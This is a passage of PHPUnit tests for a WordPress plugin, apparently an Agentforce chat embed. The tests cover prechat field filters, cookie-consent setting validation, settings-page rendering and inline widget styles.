		$this->prime_configs_cache( [ 'site_key' => 'site-key-123' ] );

		$fields = Configs::get_prechat_fields();

		$this->assertArrayHasKey( 'site_id_blog_id', $fields );
		$this->assertSame( 'site-key-123', $fields['site_id_blog_id'] );
	}

	public function test_prechat_fields_filter_adds_custom_fields(): void {
		$this->prime_configs_cache( [ 'site_key' => 'site-key-123' ] );

		$filter = function ( array $fields ): array {
			$fields['custom_field'] = 'custom_value';
			return $fields;
		};

		add_filter( 'vip_agentforce_prechat_fields', $filter );
		$fields = Configs::get_prechat_fields();
		remove_filter( 'vip_agentforce_prechat_fields', $filter );

		$this->assertArrayHasKey( 'site_id_blog_id', $fields );
		$this->assertSame( 'custom_value', $fields['custom_field'] );
	}

	public function test_prechat_fields_filter_rejects_non_array_return(): void {
		$this->prime_configs_cache( [ 'site_key' => 'site-key-123' ] );

		$filter = function (): string {
			return 'garbage';
		};

		add_filter( 'vip_agentforce_prechat_fields', $filter );
		$fields = Configs::get_prechat_fields();
		remove_filter( 'vip_agentforce_prechat_fields', $filter );

		// Should fall back to the default fields.
		$this->assertArrayHasKey( 'site_id_blog_id', $fields );
	}

	public function test_prechat_fields_filter_strips_non_string_values(): void {
		$filter = function ( array $fields ): array {
			$fields['bad_int']   = 123;
			$fields['bad_array'] = array( 'nope' );
			$fields['good']      = 'yes';
			return $fields;
		};

		add_filter( 'vip_agentforce_prechat_fields', $filter );
		$fields = Configs::get_prechat_fields();
		remove_filter( 'vip_agentforce_prechat_fields', $filter );

		$this->assertArrayNotHasKey( 'bad_int', $fields );
		$this->assertArrayNotHasKey( 'bad_array', $fields );
		$this->assertSame( 'yes', $fields['good'] );
	}

	public function test_sanitize_consent_type_returns_value_for_supported_cmp(): void {
		$settings = Settings_Page::get_instance();

		$this->assertSame( 'CookieBot', $settings->sanitize_consent_type( 'CookieBot' ) );
	}

	public function test_sanitize_consent_type_falls_back_to_default_for_invalid_value(): void {
		$settings = Settings_Page::get_instance();

		$this->assertSame( Constants::DEFAULT_CMP, $settings->sanitize_consent_type( 'InvalidCMP' ) );
		$this->assertSame( Constants::DEFAULT_CMP, $settings->sanitize_consent_type( 'onetrust' ) );
	}

	public function test_validate_cookiebot_category_normalizes_supported_values(): void {
		$settings = Settings_Page::get_instance();

		$this->assertSame( 'statistics', $settings->validate_cookiebot_category( ' Statistics ' ) );
		$this->assertSame( Constants::DEFAULT_COOKIEBOT_CATEGORY, $settings->validate_cookiebot_category( 'custom-category' ) );
	}

	public function test_settings_page_renders_react_root_with_serialized_values(): void {
		$settings = Settings_Page::get_instance();

		ob_start();
		$settings->render_settings_page();
		$output = ob_get_clean();

		$this->assertStringContainsString( 'id="vip-agentforce-settings-app"', $output );
		$this->assertStringContainsString( '&quot;values&quot;', $output );
		$this->assertStringContainsString( '&quot;consentType&quot;:&quot;Custom&quot;', $output );
		$this->assertStringNotContainsString( '&quot;strings&quot;', $output );
		$this->assertStringNotContainsString( 'Salesforce JS Embed', $output );
		$this->assertStringNotContainsString( 'Salesforce SDK URL', $output );
	}

	public function test_render_inline_styles_adds_alignment_styles(): void {
		update_option( 'vip_agentforce_alignment', 'bottom-left' );

		Assets::get_instance()->enqueue_scripts();
		Agentforce::get_instance()->render_inline_styles();
		$inline_styles = wp_styles()->get_data( 'vip-agentforce-style', 'after' );
		$inline_css    = is_array( $inline_styles ) ? implode( "\n", $inline_styles ) : '';

		$this->assertStringContainsString( '.embedded-messaging > .embeddedMessagingFrame { left: 10px }', $inline_css );
	}

	public function test_render_inline_styles_hides_minimized_frame(): void {
		Assets::get_instance()->enqueue_scripts();
		Agentforce::get_instance()->render_inline_styles();
		$inline_styles = wp_styles()->get_data( 'vip-agentforce-style', 'after' );
		$inline_css    = is_array( $inline_styles ) ? implode( "\n", $inline_styles ) : '';

		$this->assertStringContainsString( '.embedded-messaging > .embeddedMessagingFrame.isMinimized', $inline_css );
		$this->assertStringContainsString( 'display: none !important', $inline_css );
	}

	public function test_validation_returns_old_values_on_invalid_input(): void {
		$settings = Settings_Page::get_instance();
		global $wp_settings_errors;

		update_option( 'vip_agentforce_iubenda_category', '3' );

		$this->assertSame(
			Constants::DEFAULT_IUBENDA_PURPOSE_ID,
			$settings->validate_iubenda_category( '' )
		);

		$wp_settings_errors                   = [];
		$_POST['vip_agentforce_consent_type'] = 'iubenda'; // phpcs:ignore WordPress.Security.NonceVerification.Missing

		$this->assertSame(
			'3',
			$settings->validate_iubenda_category( '' )
		);
		$this->assertSame(
			'vip_agentforce_iubenda_category_error',
			get_settings_errors( 'vip_agentforce_messages' )[0]['code']
		);

		$this->assertSame(
			'3',
			$settings->validate_iubenda_category( '0' )
		);
	}
}
